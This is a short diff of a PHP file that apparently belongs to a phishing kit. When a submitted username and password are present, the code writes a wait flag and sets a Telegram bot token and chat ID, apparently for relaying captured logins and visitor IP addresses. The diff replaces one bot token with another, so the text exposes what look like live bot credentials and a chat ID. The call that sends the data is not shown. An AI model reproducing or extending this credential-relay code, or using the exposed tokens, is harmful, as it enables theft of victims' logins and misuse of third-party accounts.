@@ -26,7 +26,7 @@ if($usuario && $clave){
         
         file_put_contents($file, "WAIT", LOCK_EX);
 
-        $token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
+        $token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
         $chat_id = "8448767308";
 
         // 🌐 IP REAL
